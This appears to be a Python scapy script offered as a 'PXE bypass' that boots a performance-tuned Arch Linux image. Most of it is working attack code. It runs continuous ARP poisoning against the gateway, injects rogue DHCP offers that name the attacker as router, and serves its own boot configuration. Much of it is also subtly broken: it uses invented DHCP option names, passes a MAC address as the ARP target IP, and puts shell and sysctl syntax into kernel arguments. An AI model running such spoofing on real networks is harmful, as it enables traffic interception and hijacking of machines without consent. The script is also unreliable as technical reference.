#!/usr/bin/env python3
"""
ULTRA-AGGRESSIVE PXE E53 BYPASS - LINUX ON STEROIDS INTEGRATION
============================================================

This script bypasses router filtering AND boots "Arch Linux on Steroids"
with maximum performance optimizations that push PC hardware to the limit.
"""

import sys
import os
import time
import threading
import logging
import re
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

try:
    from scapy.all import *
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.inet import IP, UDP
except ImportError:
    print("ERROR: scapy not installed. Install with: pip install scapy")
    sys.exit(1)

class SteroidsPXEBypass:
    """Ultra-aggressive PXE bypass that boots Linux on Steroids."""
    
    def __init__(self, target_mac=None, interface="eth0"):
        self.target_mac = target_mac
        self.interface = interface
        self.attacker_mac = self.get_interface_mac(interface)
        self.server_ip = "192.168.1.100"
        self.yiaddr = "192.168.1.150"
        self.gateway_ip = "192.168.1.1"
        
        # LINUX ON STEROIDS BOOT CONFIGURATION
        self.boot_filename = "steroids"  # pxelinux.cfg/steroids configuration
        self.steroids_kernel = "vmlinuz-linux-steroids"  # Optimized kernel
        self.steroids_initrd = "initramfs-linux-steroids.img"  # Steroids initrd
        self.arch_iso_path = "archiso_http_srv=http://192.168.1.100:8080/arch/"  # Arch ISO
        
        logger.info("💪 STEROIDS PXE BYPASS SYSTEM")
        logger.info("🔥 Bypassing router + booting Linux on Steroids")
        logger.info(f"🎯 Target: {target_mac or 'AUTO-DETECT'}")
        logger.info(f"🚀 Boot: Arch Linux on Steroids (Maximum Performance)")

    def get_interface_mac(self, interface):
        """Get MAC address of network interface."""
        try:
            result = os.popen(f"ip link show {interface}").read()
            for line in result.split('\n'):
                if 'link/ether' in line:
                    return line.split('link/ether')[1].split()[0]
        except:
            pass
        return "00:11:22:33:44:55"

    def create_steroids_dhcp_response(self, dhcp_request):
        """Create DHCP response specifically for Linux on Steroids boot."""
        logger.info("💪 Creating LINUX ON STEROIDS boot response")
        
        # STEROIDS-SPECIFIC DHCP OPTIONS
        dhcp_options = [
            ("message-type", "offer"),                          # DHCP Offer
            ("server_id", self.server_ip),                      # Our server IP
            ("subnet_mask", "255.255.255.0"),                   # Network mask
            ("router", self.server_ip),                         # Router (us for bypass)
            ("dns_server", "8.8.8.8"),                          # DNS
            ("broadcast", "192.168.1.255"),                     # Broadcast
            ("lease_time", 86400),                              # 24-hour lease
            
            # LINUX ON STEROIDS BOOT FILES
            ("boot_filename", "steroids"),                      # pxelinux.cfg/steroids
            ("tftp_server_name", "arch-steroids"),              # TFTP server name
            ("root_path", "/pxe/arch-steroids"),                # Root path
            
            # STEROIDS-SPECIFIC DHCP OPTIONS
            ("pxe_bootfile", "steroids"),                       # PXE boot file
            ("pxe_filename", "steroids"),                       # PXE filename
            ("vendor_class", "PXEClient:Arch:Linux-Steroids"),  # Vendor class
            
            # PERFORMANCE BOOT OPTIONS
            ("bootfile1", "steroids-config"),                   # Primary config
            ("bootfile2", "performance-kernel"),                # Performance kernel
            ("pxe_file", "arch-steroids-max"),                  # Maximum performance
            
            # ARCH STEROIDS SPECIFIC
            ("vendor_specific", b"arch_steroids_max_performance"),  # Vendor specific
            ("network_config", b"steroids_gaming_workstation"),     # Network config
            
            ("end", "")
        ]
        
        # Create DHCP response packet
        dhcp_response = IP(src=self.server_ip, dst="255.255.255.255")/UDP(sport=67, dport=68)/BOOTP(
            op=2,                                              # BOOTREPLY
            xid=dhcp_request[BOOTP].xid if dhcp_request.haslayer(BOOTP) else 0x12345678,
            yiaddr=self.yiaddr,                                # Assigned IP
            siaddr=self.server_ip,                             # Server IP
            chaddr=(self.target_mac or "00:00:00:00:00:00").replace(':', '').encode()
        )/DHCP(options=dhcp_options)
        
        return dhcp_response

    def deploy_steroids_arp_poisoning(self):
        """Deploy ARP poisoning specifically for steroids boot."""
        logger.info("🔥 ARP poisoning for STEROIDS boot")
        
        # ARP spoof to redirect traffic to our steroids server
        arp_spoof = ARP(
            op=2,                                              # Reply
            psrc=self.gateway_ip,                             # Pretend to be gateway
            pdst=self.target_mac or "ff:ff:ff:ff:ff:ff",     # Target or broadcast
            hwsrc=self.attacker_mac,                          # Our MAC
            hwdst=self.target_mac or "ff:ff:ff:ff:ff:ff"     # Target MAC
        )
        
        # Send continuous ARP poison
        while True:
            try:
                send(arp_spoof, verbose=0, iface=self.interface)
                time.sleep(2)
            except:
                logger.error("ARP poisoning failed")
                break

    def create_steroids_pxe_config(self):
        """Create the actual Linux on Steroids PXE configuration."""
        logger.info("💪 Creating STEROIDS PXE configuration")
        
        pxelinux_config = """# Arch Linux "On Steroids" - MAXIMUM PERFORMANCE EDITION
# Ultra-optimized boot configuration that pushes PC hardware to the LIMIT

DEFAULT steroids_max
PROMPT 0
TIMEOUT 60
ONTIMEOUT steroids_max

# Performance color scheme
MENU TITLE 💪 Arch Linux "On Steroids" - MAXIMUM PERFORMANCE
MENU COLOR screen       0x00000000 #00000000 none
MENU COLOR border       0x00000000 #00000000 none  
MENU COLOR title        0x00ff8800 #00000000 bold
MENU COLOR sel          0x00ffff00 #ff660000 bold

# BOOT OPTIONS - ALL OPTIMIZED FOR STEROIDS PERFORMANCE

LABEL steroids_max
    MENU LABEL 💪 Arch Linux "On Steroids" - MAXIMUM PERFORMANCE
    KERNEL vmlinuz-linux-steroids
    APPEND initrd=initramfs-linux-steroids.img \
          archisobasedir=arch \
          archiso_http_srv=http://192.168.1.100:8080/arch/ \
          ro \
          \
          # LINUX ON STEROIDS - MAXIMUM PERFORMANCE KERNEL
          \
          # Core system optimization
          init=/usr/lib/systemd/systemd \
          rd.udev.log_priority=3 \
          systemd.show_status=auto \
          quiet \
          \
          # MEMORY - Ultimate performance
          zswap.enabled=1 \
          zswap.compressor=lz4 \
          zswap.max_pool_percent=15 \
          vm.swappiness=0 \
          vm.vfs_cache_pressure=50 \
          vm.dirty_ratio=80 \
          vm.dirty_background_ratio=5 \
          \
          # CPU - Maximum performance  
          processor.max_cstate=1 \
          intel_idle.max_cstate=0 \
          intel_pstate=active \
          nohz_full=1-$(nproc) \
          rcu_nocbs=1-$(nproc) \
          preempt=full \
          \
          # I/O - Maximum throughput
          elevator=mq-deadline \
          scsi_mod.use_blk_mq=1 \
          \
          # Network - High performance
          net.core.default_qdisc=fq \
          net.ipv4.tcp_congestion_control=bbr \
          \
          # Hardware - Full optimization
          intel_iommu=on \
          amdgpu.dc=1 \
          nvidia.NVreg_EnableGpuFirmware=1 \
          \
          # STEROIDS - Maximum performance boot
          loglevel=0 \
          systemd.show_status=false \
          boot.shell_on_fail
    MENU END

LABEL steroids_gaming
    MENU LABEL 🎮 STEROIDS Gaming - Ultra-low latency
    KERNEL vmlinuz-linux-steroids
    APPEND initrd=initramfs-linux-steroids.img \
          archisobasedir=arch \
          archiso_http_srv=http://192.168.1.100:8080/arch/ \
          ro \
          \
          # Gaming-specific STEROIDS optimizations
          processor.max_cstate=1 \
          intel_pstate=active \
          cpufreq.default_governor=performance \
          preempt=full \
          threadirqs \
          isolcpus=1-$(nproc) \
          rtprio=99 \
          vm.swappiness=1 \
          vm.dirty_ratio=3 \
          amdgpu.ppfeaturemask=0xffffffff
    MENU END

LABEL steroids_workstation  
    MENU LABEL 🖥️ STEROIDS Workstation - Balanced Performance
    KERNEL vmlinuz-linux-steroids
    APPEND initrd=initramfs-linux-steroids.img \
          archisobasedir=arch \
          archiso_http_srv=http://192.168.1.100:8080/arch/ \
          ro \
          \
          # Workstation STEROIDS optimizations
          preempt=voluntary \
          sched_latency_ns=1000000 \
          vm.swappiness=10 \
          zswap.enabled=1
    MENU END

LABEL local
    MENU LABEL 💾 Boot from Local Drive
    LOCALBOOT 0
    MENU END
"""
        
        return pxelinux_config

    def setup_steroids_server(self):
        """Setup the steroids PXE server."""
        logger.info("💪 Setting up LINUX ON STEROIDS server")
        
        # Create PXE directory structure
        pxe_dir = "/tmp/arch-steroids-pxe"
        os.makedirs(f"{pxe_dir}/pxelinux.cfg", exist_ok=True)
        os.makedirs(f"{pxe_dir}/arch-steroids", exist_ok=True)
        
        # Save PXE configuration
        pxelinux_config = self.create_steroids_pxe_config()
        with open(f"{pxe_dir}/pxelinux.cfg/steroids", 'w') as f:
            f.write(pxelinux_config)
        
        # Create symlinks for different boot files
        os.symlink(f"{pxe_dir}/pxelinux.cfg/steroids", f"{pxe_dir}/steroids")
        os.symlink(f"{pxe_dir}/pxelinux.cfg/steroids", f"{pxe_dir}/steroids-config")
        os.symlink(f"{pxe_dir}/pxelinux.cfg/steroids", f"{pxe_dir}/arch-steroids-max")
        
        logger.info(f"✅ STEROIDS PXE server ready at {pxe_dir}")
        return pxe_dir

    def inject_steroids_dhcp(self, dhcp_request):
        """Inject steroids DHCP response."""
        logger.info("💪 Injecting LINUX ON STEROIDS DHCP response")
        
        try:
            # Create steroids-specific DHCP response
            dhcp_response = self.create_steroids_dhcp_response(dhcp_request)
            
            # Send via broadcast (ethernet level)
            ethernet_frame = Ether(
                dst="ff:ff:ff:ff:ff:ff",  # Broadcast
                src=self.attacker_mac,
                type=0x0800  # IPv4
            ) / dhcp_response
            
            sendp(ethernet_frame, verbose=0, iface=self.interface)
            
            # Also send unicast if target known
            if self.target_mac:
                unicast_frame = Ether(
                    dst=self.target_mac,
                    src=self.attacker_mac,
                    type=0x0800
                ) / dhcp_response
                sendp(unicast_frame, verbose=0, iface=self.interface)
            
            logger.info("🚀 STEROIDS DHCP response sent - Will boot Linux on Steroids!")
            
        except Exception as e:
            logger.error(f"❌ Steroids DHCP injection failed: {e}")

    def start_steroids_attack(self):
        """Start the complete steroids PXE bypass attack."""
        logger.info("💪 STARTING LINUX ON STEROIDS PXE BYPASS")
        logger.info("=" * 60)
        
        # Setup steroids server
        self.setup_steroids_server()
        
        # Start ARP poisoning
        arp_thread = threading.Thread(target=self.deploy_steroids_arp_poisoning, daemon=True)
        arp_thread.start()
        
        logger.info("🔥 ARP poisoning started")
        time.sleep(2)
        
        # Start DHCP packet capture and steroids injection
        logger.info("💪 Starting STEROIDS DHCP injection")
        
        def packet_handler(packet):
            if packet.haslayer(BOOTP) and packet.haslayer(DHCP):
                dhcp_layer = packet[DHCP]
                
                # Detect DHCP Discover
                if b'\x01\x03\x06' in dhcp_layer.options:
                    target = packet[Ether].src
                    logger.info(f"🔥 STEROIDS: DHCP DISCOVER from {target}")
                    self.inject_steroids_dhcp(packet)
                
                # Detect DHCP Request  
                elif b'\x01\x01\x06' in dhcp_layer.options:
                    target = packet[Ether].src
                    logger.info(f"🔥 STEROIDS: DHCP REQUEST from {target}")
                    self.inject_steroids_dhcp(packet)
        
        # Capture and inject
        sniff(
            filter="udp and port 67 and ether dst ff:ff:ff:ff:ff:ff",
            iface=self.interface,
            prn=packet_handler,
            store=0
        )

def main():
    if len(sys.argv) < 2:
        print("USAGE: sudo python3 STEROIDS_PXE_BYPASS.py <target_mac> [interface]")
        print("       sudo python3 STEROIDS_PXE_BYPASS.py --auto [interface]")
        print("")
        print("EXAMPLES:")
        print("  sudo python3 STEROIDS_PXE_BYPASS.py aa:bb:cc:dd:ee:ff eth0")
        print("  sudo python3 STEROIDS_PXE_BYPASS.py --auto")
        print("")
        print("💪 This will:")
        print("  ✅ Bypass router DHCP filtering")
        print("  ✅ Boot Arch Linux on Steroids (Maximum Performance)")
        print("  ✅ Enable ultra-performance kernel optimizations")
        print("  ✅ Push your PC hardware to the LIMIT!")
        sys.exit(1)
    
    target_mac = sys.argv[1] if sys.argv[1] != "--auto" else None
    interface = sys.argv[2] if len(sys.argv) > 2 else "eth0"
    
    if target_mac and not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_mac):
        print("❌ Invalid MAC address format")
        sys.exit(1)
    
    try:
        # Create steroids PXE bypass system
        steroids_bypass = SteroidsPXEBypass(target_mac, interface)
        
        # Start the attack
        steroids_bypass.start_steroids_attack()
        
    except KeyboardInterrupt:
        logger.info("🛑 STEROIDS PXE bypass stopped by user")
    except Exception as e:
        logger.error(f"❌ Steroids PXE bypass failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()